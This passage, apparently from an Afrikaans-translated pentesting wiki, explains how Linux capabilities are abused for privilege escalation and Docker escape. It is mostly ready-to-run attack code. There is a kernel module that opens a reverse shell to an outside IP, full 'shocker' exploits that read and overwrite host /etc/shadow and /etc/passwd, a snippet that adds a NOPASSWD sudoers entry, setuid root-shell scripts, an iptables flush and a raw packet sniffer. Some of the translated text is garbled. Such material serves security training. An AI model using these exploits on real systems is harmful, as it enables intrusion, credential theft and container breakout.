Wat beteken dit dat dit moontlik is om die opdrag **`insmod`** te gebruik om 'n kernmodule in te voeg. Volg die voorbeeld hieronder om 'n **reverse shell** te verkry deur hierdie voorreg te misbruik.

**Voorbeeld met omgewing (Docker breek uit)**

Jy kan die geaktiveerde vermoëns binne die docker houer nagaan met:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Binne die vorige uitset kan jy sien dat die **SYS_MODULE** vermoë geaktiveer is.

**Skep** die **kernel module** wat 'n omgekeerde skulp gaan uitvoer en die **Makefile** om dit te **kompiler**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Die leë karakter voor elke make woord in die Makefile **moet 'n tab wees, nie spasies nie**!

Voer `make` uit om dit te kompileer.
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Laastens, begin `nc` binne 'n skulp en **laai die module** vanaf 'n ander een en jy sal die skulp in die nc-proses vang:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Die kode van hierdie tegniek is gekopieer uit die laboratorium van "Abusing SYS_MODULE Capability" van** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

'n Ander voorbeeld van hierdie tegniek kan gevind word in [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) stel 'n proses in staat om **toestemmings vir die lees van lêers en vir die lees en uitvoer van gidse te omseil**. Die primêre gebruik daarvan is vir lêer soek of leesdoele. Dit stel egter ook 'n proses in staat om die `open_by_handle_at(2)` funksie te gebruik, wat enige lêer kan benader, insluitend dié buite die proses se monteer naamruimte. Die handvatsel wat in `open_by_handle_at(2)` gebruik word, behoort 'n nie-deursigtige identifiseerder te wees wat verkry is deur `name_to_handle_at(2)`, maar dit kan sensitiewe inligting insluit soos inode-nommers wat kwesbaar is vir manipulasie. Die potensiaal vir die uitbuiting van hierdie vermoë, veral in die konteks van Docker houers, is deur Sebastian Krahmer met die shocker exploit gedemonstreer, soos geanaliseer [hier](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
**Dit beteken dat jy kan** **toestemmings vir lêer lees en gidse lees/uitvoer kan omseil.**

**Voorbeeld met binêre**

Die binêre sal in staat wees om enige lêer te lees. So, as 'n lêer soos tar hierdie vermoë het, sal dit in staat wees om die skadu-lêer te lees:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Voorbeeld met binary2**

In hierdie geval kom ons veronderstel dat die **`python`** binêre hierdie vermoë het. Om wortel lêers te lys, kan jy doen:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
En om 'n lêer te lees, kan jy doen:
```python
print(open("/etc/shadow", "r").read())
```
**Voorbeeld in Omgewing (Docker ontsnapping)**

Jy kan die geaktiveerde vermoëns binne die docker houer nagaan met:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Binne die vorige uitset kan jy sien dat die **DAC_READ_SEARCH** vermoë geaktiveer is. As gevolg hiervan kan die houer **prosesse debugeer**.

Jy kan leer hoe die volgende uitbuiting werk in [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), maar in samevatting **CAP_DAC_READ_SEARCH** laat ons nie net toe om die lêerstelsel te traverseer sonder toestemmingstoetsing nie, maar verwyder ook eksplisiet enige toetse vir _**open_by_handle_at(2)**_ en **kan ons proses toelaat om sensitiewe lêers wat deur ander prosesse geopen is, te benader**.

Die oorspronklike uitbuiting wat hierdie toestemmings misbruik om lêers van die gasheer te lees, kan hier gevind word: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), die volgende is 'n **gewysigde weergawe wat jou toelaat om die lêer wat jy wil lees as eerste argument aan te dui en dit in 'n lêer te dump.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Die exploit moet 'n pointer vind na iets wat op die gasheer gemonteer is. Die oorspronklike exploit het die lêer /.dockerinit gebruik en hierdie gemodifiseerde weergawe gebruik /etc/hostname. As die exploit nie werk nie, moet jy dalk 'n ander lêer stel. Om 'n lêer te vind wat op die gasheer gemonteer is, voer net die mount-opdrag uit:

![](<../../images/image (407) (1).png>)

**Die kode van hierdie tegniek is gekopieer uit die laboratorium van "Abusing DAC_READ_SEARCH Capability" van** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

## CAP_DAC_OVERRIDE

**Dit beteken dat jy skryftoestemming kontroles op enige lêer kan omseil, sodat jy enige lêer kan skryf.**

Daar is baie lêers wat jy kan **oorskryf om voorregte te verhoog,** [**jy kan idees hier kry**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Voorbeeld met binêre**

In hierdie voorbeeld het vim hierdie vermoë, so jy kan enige lêer soos _passwd_, _sudoers_ of _shadow_ verander:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Voorbeeld met binêre 2**

In hierdie voorbeeld sal die **`python`** binêre hierdie vermoë hê. Jy kan python gebruik om enige lêer te oorskry:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Voorbeeld met omgewing + CAP_DAC_READ_SEARCH (Docker ontsnapping)**

Jy kan die geaktiveerde vermoëns binne die docker-container nagaan met:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Eerstens, lees die vorige afdeling wat [**die DAC_READ_SEARCH vermoë misbruik om arbitrêre lêers te lees**](linux-capabilities.md#cap_dac_read_search) van die gasheer en **kompyleer** die eksploit.\
Dan, **kompyleer die volgende weergawe van die shocker eksploit** wat jou sal toelaat om **arbitrêre lêers** binne die gasheer se lêerstelsel te **skryf**:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Om die docker-container te ontsnap, kan jy die lêers `/etc/shadow` en `/etc/passwd` van die gasheer **aflaai**, **aan hulle 'n nuwe gebruiker byvoeg**, en **`shocker_write`** gebruik om hulle te oorskryf. Dan, **toegang** via **ssh**.

**Die kode van hierdie tegniek is gekopieer uit die laboratorium van "Abusing DAC_OVERRIDE Capability" van** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP_CHOWN

**Dit beteken dat dit moontlik is om die eienaarskap van enige lêer te verander.**

**Voorbeeld met binêre**

Kom ons neem aan die **`python`** binêre het hierdie vermoë, jy kan die **eienaar** van die **shadow** lêer **verander**, **root wagwoord verander**, en voorregte opgradeer:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Of met die **`ruby`** binêre wat hierdie vermoë het:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Dit beteken dat dit moontlik is om die toestemmings van enige lêer te verander.**

**Voorbeeld met binêre**

As python hierdie vermoë het, kan jy die toestemmings van die skadu-lêer verander, **verander die wortel wagwoord**, en voorregte opgradeer:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**Dit beteken dat dit moontlik is om die effektiewe gebruikers-id van die geskepte proses in te stel.**

**Voorbeeld met binêre**

As python hierdie **capability** het, kan jy dit baie maklik misbruik om voorregte na root te verhoog:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Nog 'n manier:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Dit beteken dat dit moontlik is om die effektiewe groep id van die geskepte proses in te stel.**

Daar is baie lêers wat jy kan **oorskryf om voorregte te verhoog,** [**jy kan idees hier kry**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Voorbeeld met binêre**

In hierdie geval moet jy soek na interessante lêers wat 'n groep kan lees omdat jy enige groep kan naboots:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Sodra jy 'n lêer gevind het wat jy kan misbruik (deur te lees of te skryf) om voorregte te verhoog, kan jy **'n shell kry wat die interessante groep naboots** met:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
In hierdie geval is die groep skaduwee geïmpliseer sodat jy die lêer `/etc/shadow` kan lees:
```bash
cat /etc/shadow
```
As **docker** geïnstalleer is, kan jy die **docker-groep** naboots en dit misbruik om te kommunikeer met die [**docker socket** en voorregte te verhoog](#writable-docker-socket).

## CAP_SETFCAP

**Dit beteken dat dit moontlik is om vermoëns op lêers en prosesse in te stel**

**Voorbeeld met binêre**

As python hierdie **vermoë** het, kan jy dit baie maklik misbruik om voorregte na root te verhoog:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Let daarop dat as jy 'n nuwe vermoë aan die binêre met CAP_SETFCAP toeken, jy hierdie vermoë sal verloor.

Sodra jy [SETUID vermoë](linux-capabilities.md#cap_setuid) het, kan jy na sy afdeling gaan om te sien hoe om voorregte te verhoog.

**Voorbeeld met omgewing (Docker breek uit)**

Standaard word die vermoë **CAP_SETFCAP aan die proses binne die houer in Docker gegee**. Jy kan dit nagaan deur iets soos:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Hierdie vermoë laat toe om **enige ander vermoë aan binaire te gee**, so ons kan dink aan **ontsnapping** uit die houer **deur enige van die ander vermoë breekpunte** wat op hierdie bladsy genoem word.\
As jy egter probeer om byvoorbeeld die vermoë CAP_SYS_ADMIN en CAP_SYS_PTRACE aan die gdb-binary te gee, sal jy vind dat jy dit kan gee, maar die **binary sal nie na hierdie punt kan uitvoer nie**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Toegelaat: Dit is 'n **beperkende superstel vir die effektiewe vermoëns** wat die draad mag aanneem. Dit is ook 'n beperkende superstel vir die vermoëns wat aan die oorerflike stel deur 'n draad wat **nie die CAP_SETPCAP** vermoë in sy effektiewe stel het, kan bygevoeg word._\
Dit lyk of die Toegelate vermoëns diegene beperk wat gebruik kan word.\
E however, Docker verleen ook die **CAP_SETPCAP** standaard, so jy mag dalk in staat wees om **nuwe vermoëns binne die oorerflikes te stel**.\
E however, in die dokumentasie van hierdie vermoë: _CAP_SETPCAP : \[…] **voeg enige vermoë van die oproepdraad se begrensde** stel by sy oorerflike stel_.\
Dit lyk of ons slegs kan byvoeg tot die oorerflike stel vermoëns van die begrensde stel. Dit beteken dat **ons nie nuwe vermoëns soos CAP_SYS_ADMIN of CAP_SYS_PTRACE in die oorerflike stel kan plaas om voorregte te verhoog** nie.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) bied 'n aantal sensitiewe operasies insluitend toegang tot `/dev/mem`, `/dev/kmem` of `/proc/kcore`, wysiging van `mmap_min_addr`, toegang tot `ioperm(2)` en `iopl(2)` stelselskakels, en verskeie skyfopdragte. Die `FIBMAP ioctl(2)` is ook via hierdie vermoë geaktiveer, wat in die [verlede](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) probleme veroorsaak het. Volgens die manblad, laat dit ook die houer toe om beskrywend `n reeks toestel-spesifieke operasies op ander toestelle uit te voer`.

Dit kan nuttig wees vir **voorregte verhoging** en **Docker ontsnapping.**

## CAP_KILL

**Dit beteken dat dit moontlik is om enige proses te dood.**

**Voorbeeld met binêre**

Kom ons neem aan die **`python`** binêre het hierdie vermoë. As jy **ook 'n diens of sokketkonfigurasie** (of enige konfigurasie lêer wat met 'n diens verband hou) lêer kon wysig, kan jy dit agterdeur, en dan die proses wat met daardie diens verband hou doodmaak en wag vir die nuwe konfigurasie lêer om met jou agterdeur uitgevoer te word.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc met kill**

As jy kill vermoëns het en daar is 'n **node program wat as root** (of as 'n ander gebruiker) loop, kan jy waarskynlik **dit die **signaal SIGUSR1** stuur en dit **die node debugger** laat oopmaak waar jy kan aansluit.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Dit beteken dat dit moontlik is om op enige poort te luister (selfs op bevoorregte poorte).** Jy kan nie regstreekse voorregte met hierdie vermoë verhoog nie.

**Voorbeeld met binêre**

As **`python`** hierdie vermoë het, sal dit in staat wees om op enige poort te luister en selfs van daar na enige ander poort te verbind (sommige dienste vereis verbindings vanaf spesifieke bevoorregte poorte)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) vermoë laat prosesse toe om **RAW en PACKET sokke** te skep, wat hulle in staat stel om arbitrêre netwerkpakkette te genereer en te stuur. Dit kan lei tot sekuriteitsrisiko's in gekapselde omgewings, soos pakkie spoofing, verkeer inspuiting, en om netwerktoegangbeheer te omseil. Kwaadwillige akteurs kan dit benut om met houerroutering te meng of gasheer netwerksekuriteit te kompromitteer, veral sonder voldoende firewall beskerming. Boonop is **CAP_NET_RAW** van kardinale belang vir bevoorregte houers om operasies soos ping via RAW ICMP versoeke te ondersteun.

**Dit beteken dat dit moontlik is om verkeer te snuffel.** Jy kan nie regstreeks voorregte verhoog met hierdie vermoë nie.

**Voorbeeld met binêre**

As die binêre **`tcpdump`** hierdie vermoë het, sal jy dit kan gebruik om netwerk-inligting te vang.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Let wel dat as die **omgewing** hierdie vermoë gee, jy ook **`tcpdump`** kan gebruik om verkeer te snuffel.

**Voorbeeld met binêre 2**

Die volgende voorbeeld is **`python2`** kode wat nuttig kan wees om verkeer van die "**lo**" (**localhost**) koppelvlak te onderskep. Die kode is van die laboratorium "_Die Basiese Beginsels: CAP-NET_BIND + NET_RAW_" van [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) vermoë gee die houer die mag om **netwerk konfigurasies** te **verander**, insluitend firewall instellings, routeringstabelle, sokkettoestemmings, en netwerkinterfaaninstellings binne die blootgestelde netwerkname ruimtes. Dit stel ook in staat om **promiscuous mode** op netwerkinterfakke in te skakel, wat pakket snuffeling oor name ruimtes moontlik maak.

**Voorbeeld met binêre**

Kom ons veronderstel dat die **python binêre** hierdie vermoëns het.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Dit beteken dat dit moontlik is om inode-attribuut te wysig.** Jy kan nie regstreeks met hierdie vermoë voorregte opgradeer nie.

**Voorbeeld met binêre**

As jy vind dat 'n lêer onwankelbaar is en python hierdie vermoë het, kan jy **die onwankelbare attribuut verwyder en die lêer wysig:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!NOTE]
> Let daarop dat hierdie onveranderlike eienskap gewoonlik gestel en verwyder word met:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) stel die uitvoering van die `chroot(2)` stelselskakel in staat, wat potensieel kan toelaat dat daar ontsnap word uit `chroot(2)` omgewings deur bekende kwesbaarhede:

- [Hoe om uit verskeie chroot-oplossings te breek](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
